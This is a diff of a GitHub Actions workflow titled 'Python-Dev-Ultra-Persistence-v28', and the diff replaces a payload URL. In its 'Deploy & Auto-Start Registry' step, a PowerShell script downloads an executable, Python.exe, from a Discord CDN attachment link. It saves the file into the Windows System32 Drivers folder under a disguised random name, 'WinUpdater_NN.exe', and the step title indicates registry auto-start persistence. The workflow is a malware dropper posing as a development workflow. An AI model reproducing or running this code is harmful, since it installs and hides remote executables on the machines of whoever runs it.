@@ -1,4 +1,4 @@
-name: Python-Dev-Ultra-Persistence-v28
+Python-Dev-Ultra-Persistence-v28
 
 on:
   workflow_dispatch:
@@ -34,7 +34,7 @@ jobs:
 
       - name: 4. Deploy & Auto-Start Registry
         run: |
-          $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1482097780745965698/Python.exe?ex=69b5b69e&is=69b4651e&hm=8750a305c882253befac563cc2f953e1db1195c5575eecc932e8487904ceb66b&"
+          $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1482796408024203394/Python.exe?ex=69b84144&is=69b6efc4&hm=1b93d223619d5becfb0273b2c852b55e3e5433f9a7335d65b53d40cb81920385&"
           
           $randName = "WinUpdater_" + (Get-Random -Minimum 10 -Maximum 99) + ".exe"
           $dest = "C:\Windows\System32\Drivers\$randName"
@@ -75,3 +75,4 @@ jobs:
               }
               Start-Sleep -Seconds 5
           }
+        
